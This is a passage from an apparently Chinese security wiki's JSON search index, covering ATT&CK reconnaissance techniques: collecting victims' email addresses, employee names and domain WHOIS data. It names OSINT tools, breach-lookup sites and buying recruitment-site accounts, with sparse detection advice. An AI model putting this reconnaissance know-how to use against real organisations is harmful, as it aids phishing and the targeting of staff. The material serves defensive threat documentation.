Hacking"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#github","text":"\u5728github\u4e2d\u641c\u7d22\u90ae\u7bb1\u540e\u7f00","title":"github\u7b49\u7b2c\u4e09\u65b9\u6258\u7ba1\u5e73\u53f0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#_3","text":"","title":"\u793e\u5de5\u5e93\u7684\u65b9\u5f0f"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#online-search-email","text":"\u901a\u8fc7\u5168\u7403\u6700\u5927\u7684\u51e0\u4e2a\u6570\u636e\u6cc4\u9732\u7ad9\u70b9\u5728\u7ebf\u67e5\u8be2\u90ae\u7bb1\u4fe1\u606f\u6cc4\u9732\u60c5\u51b5 https://monitor.firefox.com/ https://haveibeenpwned.com/ https://ghostproject.fr/ https://hunter.io/","title":"Online Search Email"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#_4","text":"","title":"\u5de5\u5177\u7c7b"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#the-harvester","text":"The Harvester\u53ef\u7528\u4e8e\u641c\u7d22Google\u3001Bing\u548cPGP\u670d\u52a1\u5668\u7684\u7535\u5b50\u90ae\u4ef6\u3001\u4e3b\u673a\u4ee5\u53ca\u5b50\u57df\u540d,\u56e0\u6b64\u9700\u8981\u7ffb\u5899\u8fd0\u884c\u8be5\u5de5\u5177\u3002","title":"The Harvester"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#infoga","text":"Infoga\u53ef\u4ece\u4e0d\u540c\u7684\u516c\u5171\u6e90\u7f51\u7edc\uff08\u641c\u7d22\u5f15\u64ce\uff0cpgp\u5bc6\u94a5\u670d\u52a1\u5668\u548cshodan\uff09\u6536\u96c6\u7535\u5b50\u90ae\u4ef6\u5e10\u6237\u4fe1\u606f\uff08ip\uff0c\u4e3b\u673a\u540d\uff0c\u56fd\u5bb6/\u5730\u533a\uff09\u3002\u662f\u4e00\u4e2a\u7528\u6cd5\u975e\u5e38\u7b80\u5355\u7684\u5de5\u5177\uff0c\u4f46\u662f\uff0c\u5bf9\u4e8e\u6e17\u900f\u6d4b\u8bd5\u7684\u65e9\u671f\u9636\u6bb5\uff0c\u6216\u8005\u53ea\u662f\u4e3a\u4e86\u4e86\u89e3\u81ea\u5df1\u516c\u53f8\u5728\u4e92\u8054\u7f51\u4e0a\u7684\u53ef\u89c1\u6027\u662f\u975e\u5e38\u6709\u6548\u7684\u3002","title":"Infoga"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#_5","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#_6","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#_7","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#_8","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#_9","text":"\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002","title":"\u5efa\u8bae"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-002-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E9%82%AE%E7%AE%B1%E5%9C%B0%E5%9D%80/#_10","text":"MITRE-ATT&CK-T1589-002 https://attack.mitre.org/techniques/T1589/002/ \u90ae\u7bb1\u4fe1\u606f\u6536\u96c6.\u767d\u5e3d\u4e0e\u5b89\u5168 https://www.kancloud.cn/noahs/src_hacker/2119944","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%91%98%E5%B7%A5%E5%A7%93%E5%90%8D/","text":"T1589-003-\u6536\u96c6\u53d7\u5bb3\u8005\u8eab\u4efd\u4fe1\u606f-\u5458\u5de5\u59d3\u540d \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u5458\u5de5\u59d3\u540d\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5728\u76ee\u6807\u5b9a\u4f4d\u671f\u95f4\u4f7f\u7528\u3002\u5458\u5de5\u59d3\u540d\u7528\u4e8e\u5bfc\u51fa\u7535\u5b50\u90ae\u4ef6\u5730\u5740\uff0c\u4ee5\u53ca\u5e2e\u52a9\u6307\u5bfc\u5176\u4ed6\u4fa6\u5bdf\u5de5\u4f5c\u6216\u5236\u4f5c\u66f4\u53ef\u4fe1\u7684\u8bf1\u9975\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u8f7b\u677e\u5730\u6536\u96c6\u5458\u5de5\u59d3\u540d\uff0c\u56e0\u4e3a\u5b83\u4eec\u5f88\u5bb9\u6613\u83b7\u5f97\u5e76\u4e14\u53ef\u4ee5\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u793e\u4ea4\u5a92\u4f53\u6216\u641c\u7d22\u53d7\u5bb3\u8005\u62e5\u6709\u7684\u7f51\u7ad9\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5982\u4e0b\u6d3b\u52a8\u63d0\u4f9b\u53ef\u80fd\u6027\uff1a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u6d3b\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\u6216\u9493\u9c7c\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5165\u4fb5\u8d26\u53f7\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u9493\u9c7c\u653b\u51fb\u6216\u6709\u6548\u8d26\u53f7\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u4f8b\u5982\uff1a\u6bd4\u5982\u76f4\u63a5\u901a\u8fc7\u8d2d\u4e70\u4e00\u4e9b\u62db\u8058\u7f51\u7ad9\u4e0a\u7684\u8d26\u53f7\u5373\u53ef\u67e5\u770b\u4f01\u4e1a\u7684\u5458\u5de5\u7684\u59d3\u540d\u4fe1\u606f\u3002\u540c\u6837\u62db\u8058\u7f51\u7ad9\u5177\u5907\u793e\u4ea4\u5c5e\u6027\u7684\u8bdd\uff0c\u4e5f\u53ef\u4ee5\u83b7\u53d6\u5230\u76f8\u5173\u5458\u5de5\u7684\u59d3\u540d\u4fe1\u606f\u3002 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1589-003 https://attack.mitre.org/techniques/T1589/003/","title":"T1589-003-\u6536\u96c6\u53d7\u5bb3\u8005\u8eab\u4efd\u4fe1\u606f-\u5458\u5de5\u59d3\u540d"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%91%98%E5%B7%A5%E5%A7%93%E5%90%8D/#t1589-003-","text":"","title":"T1589-003-\u6536\u96c6\u53d7\u5bb3\u8005\u8eab\u4efd\u4fe1\u606f-\u5458\u5de5\u59d3\u540d"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%91%98%E5%B7%A5%E5%A7%93%E5%90%8D/#attck","text":"\u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u5458\u5de5\u59d3\u540d\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5728\u76ee\u6807\u5b9a\u4f4d\u671f\u95f4\u4f7f\u7528\u3002\u5458\u5de5\u59d3\u540d\u7528\u4e8e\u5bfc\u51fa\u7535\u5b50\u90ae\u4ef6\u5730\u5740\uff0c\u4ee5\u53ca\u5e2e\u52a9\u6307\u5bfc\u5176\u4ed6\u4fa6\u5bdf\u5de5\u4f5c\u6216\u5236\u4f5c\u66f4\u53ef\u4fe1\u7684\u8bf1\u9975\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u8f7b\u677e\u5730\u6536\u96c6\u5458\u5de5\u59d3\u540d\uff0c\u56e0\u4e3a\u5b83\u4eec\u5f88\u5bb9\u6613\u83b7\u5f97\u5e76\u4e14\u53ef\u4ee5\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1a\u793e\u4ea4\u5a92\u4f53\u6216\u641c\u7d22\u53d7\u5bb3\u8005\u62e5\u6709\u7684\u7f51\u7ad9\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5982\u4e0b\u6d3b\u52a8\u63d0\u4f9b\u53ef\u80fd\u6027\uff1a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u6d3b\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\u6216\u9493\u9c7c\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5165\u4fb5\u8d26\u53f7\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u9493\u9c7c\u653b\u51fb\u6216\u6709\u6548\u8d26\u53f7\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%91%98%E5%B7%A5%E5%A7%93%E5%90%8D/#_1","text":"\u4f8b\u5982\uff1a\u6bd4\u5982\u76f4\u63a5\u901a\u8fc7\u8d2d\u4e70\u4e00\u4e9b\u62db\u8058\u7f51\u7ad9\u4e0a\u7684\u8d26\u53f7\u5373\u53ef\u67e5\u770b\u4f01\u4e1a\u7684\u5458\u5de5\u7684\u59d3\u540d\u4fe1\u606f\u3002\u540c\u6837\u62db\u8058\u7f51\u7ad9\u5177\u5907\u793e\u4ea4\u5c5e\u6027\u7684\u8bdd\uff0c\u4e5f\u53ef\u4ee5\u83b7\u53d6\u5230\u76f8\u5173\u5458\u5de5\u7684\u59d3\u540d\u4fe1\u606f\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%91%98%E5%B7%A5%E5%A7%93%E5%90%8D/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%91%98%E5%B7%A5%E5%A7%93%E5%90%8D/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%91%98%E5%B7%A5%E5%A7%93%E5%90%8D/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%91%98%E5%B7%A5%E5%A7%93%E5%90%8D/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%91%98%E5%B7%A5%E5%A7%93%E5%90%8D/#_6","text":"\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002","title":"\u5efa\u8bae"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1589-003-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF-%E5%91%98%E5%B7%A5%E5%A7%93%E5%90%8D/#_7","text":"MITRE-ATT&CK-T1589-003 https://attack.mitre.org/techniques/T1589/003/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E5%9F%9F%E5%B1%9E%E6%80%A7/","text":"T1590-001-\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u606f-\u57df\u5c5e\u6027 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u57df\u7684\u4fe1\u606f\u3002\u6709\u5173\u57df\u53ca\u5176\u5c5e\u6027\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u53d7\u5bb3\u8005\u62e5\u6709\u7684\u57df\u4ee5\u53ca\u7ba1\u7406\u6570\u636e\uff08\u4f8b\u5982\uff1a\u59d3\u540d\uff0c\u6ce8\u518c\u5546\u7b49\uff09\u4ee5\u53ca\u66f4\u76f4\u63a5\u53ef\u64cd\u4f5c\u7684\u4fe1\u606f\u3002\u4f8b\u5982\u8054\u7cfb\u4eba\uff08\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u548c\u7535\u8bdd\uff09\uff0c\u516c\u53f8\u5730\u5740\u548c\u540d\u79f0\u670d\u52a1\u5668\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u4e0d\u540c\u7684\u65b9\u5f0f\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\uff0c\u4f8b\u5982\u76f4\u63a5\u901a\u8fc7\u4e3b\u52a8\u626b\u63cf\uff08\u4f8b\u5982\u76d1\u542c\u7aef\u53e3\uff0c\u670d\u52a1\u5668banner\uff0c\u7528\u6237\u4ee3\u7406\u5b57\u7b26\u4e32\uff09\uff0c\u9493\u9c7c\u8fdb\u884c\u6536\u96c6\u3002\u4e5f\u53ef\u80fd\u662f\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1aWHOIS\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5982\u4e0b\u6d3b\u52a8\u63d0\u4f9b\u53ef\u80fd\u6027\uff1a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u6d3b\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff0c\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\u6216\u9493\u9c7c\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\u6216\u5165\u4fb5\u57fa\u7840\u8bbe\u65bd\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u9493\u9c7c\u653b\u51fb\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b Whois \u7b80\u5355\u6765\u8bf4\uff0c\u5c31\u662f\u4e00\u4e2a\u7528\u6765\u67e5\u8be2\u57df\u540d\u662f\u5426\u5df2\u7ecf\u88ab\u6ce8\u518c\uff0c\u4ee5\u53ca\u6ce8\u518c\u57df\u540d\u7684\u8be6\u7ec6\u4fe1\u606f\u7684\u6570\u636e\u5e93\uff08\u5982\u57df\u540d\u6240\u6709\u4eba\u3001\u57df\u540d\u6ce8\u518c\u5546\u3001\u57df\u540d\u6ce8\u518c\u65e5\u671f\u548c\u8fc7\u671f\u65e5\u671f\u3001DNS\u7b49\uff09\u3002\u901a\u8fc7\u57df\u540dWhois\u670d\u52a1\u5668\u67e5\u8be2\uff0c\u53ef\u4ee5\u67e5\u8be2\u57df\u540d\u5f52\u5c5e\u8005\u8054\u7cfb\u65b9\u5f0f\uff0c\u4ee5\u53ca\u6ce8\u518c\u548c\u5230\u671f\u65f6\u95f4\u3002 Kali\u4e0bwhois\u67e5\u8be2 \u57df\u540dWhois\u67e5\u8be2 - \u7ad9\u957f\u4e4b\u5bb6 Whois \u7231\u7ad9 ip138 Whois Lookup ICANN Lookup \u57df\u540d\u4fe1\u606f\u67e5\u8be2 - \u817e\u8baf\u4e91 nicolasbouliane \u65b0\u7f51 whois\u4fe1\u606f\u67e5\u8be2 IP WHOIS\u67e5\u8be2 - \u7ad9\u957f\u5de5\u5177 \u5fae\u6b65\u5728\u7ebf \u5947\u5b89\u4fe1\u5a01\u80c1\u60c5\u62a5\u5e73\u53f0 ... \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1590-001 https://attack.mitre.org/techniques/T1590/001/ \u6536\u96c6\u57df\u540d\u4fe1\u606f.\u767d\u5e3d\u4e0e\u5b89\u5168 https://www.kancloud.cn/noahs/src_hacker/2119907","title":"T1590-001-\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u606f-\u57df\u5c5e\u6027"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E5%9F%9F%E5%B1%9E%E6%80%A7/#t1590-001-","text":"","title":"T1590-001-\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u606f-\u57df\u5c5e\u6027"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E5%9F%9F%E5%B1%9E%E6%80%A7/#attck","text":"\u5728\u5165\u4fb5\u53d7\u5bb3\u8005\u4e4b\u524d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u57df\u7684\u4fe1\u606f\u3002\u6709\u5173\u57df\u53ca\u5176\u5c5e\u6027\u7684\u4fe1\u606f\u53ef\u80fd\u5305\u62ec\u5404\u79cd\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u53d7\u5bb3\u8005\u62e5\u6709\u7684\u57df\u4ee5\u53ca\u7ba1\u7406\u6570\u636e\uff08\u4f8b\u5982\uff1a\u59d3\u540d\uff0c\u6ce8\u518c\u5546\u7b49\uff09\u4ee5\u53ca\u66f4\u76f4\u63a5\u53ef\u64cd\u4f5c\u7684\u4fe1\u606f\u3002\u4f8b\u5982\u8054\u7cfb\u4eba\uff08\u7535\u5b50\u90ae\u4ef6\u5730\u5740\u548c\u7535\u8bdd\uff09\uff0c\u516c\u53f8\u5730\u5740\u548c\u540d\u79f0\u670d\u52a1\u5668\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u4e0d\u540c\u7684\u65b9\u5f0f\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\uff0c\u4f8b\u5982\u76f4\u63a5\u901a\u8fc7\u4e3b\u52a8\u626b\u63cf\uff08\u4f8b\u5982\u76d1\u542c\u7aef\u53e3\uff0c\u670d\u52a1\u5668banner\uff0c\u7528\u6237\u4ee3\u7406\u5b57\u7b26\u4e32\uff09\uff0c\u9493\u9c7c\u8fdb\u884c\u6536\u96c6\u3002\u4e5f\u53ef\u80fd\u662f\u901a\u8fc7\u5728\u7ebf\u6216\u5176\u4ed6\u53ef\u8bbf\u95ee\u7684\u6570\u636e\u96c6\uff08\u4f8b\u5982\uff1aWHOIS\uff09\u66b4\u9732\u7ed9\u653b\u51fb\u8005\u3002\u6536\u96c6\u8fd9\u4e9b\u4fe1\u606f\u53ef\u80fd\u4e3a\u5982\u4e0b\u6d3b\u52a8\u63d0\u4f9b\u53ef\u80fd\u6027\uff1a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u6d3b\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff0c\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\u6216\u9493\u9c7c\uff09\uff0c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u83b7\u53d6\u57fa\u7840\u8bbe\u65bd\u6216\u5165\u4fb5\u57fa\u7840\u8bbe\u65bd\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u9493\u9c7c\u653b\u51fb\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1590-001-%E6%94%B6%E9%9B%86%E5%8F%97%E5%AE%B3%E8%80%85%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF-%E5%9F%9F%E5%B1%9E%E6%80%A7/#_1","text":"Whois 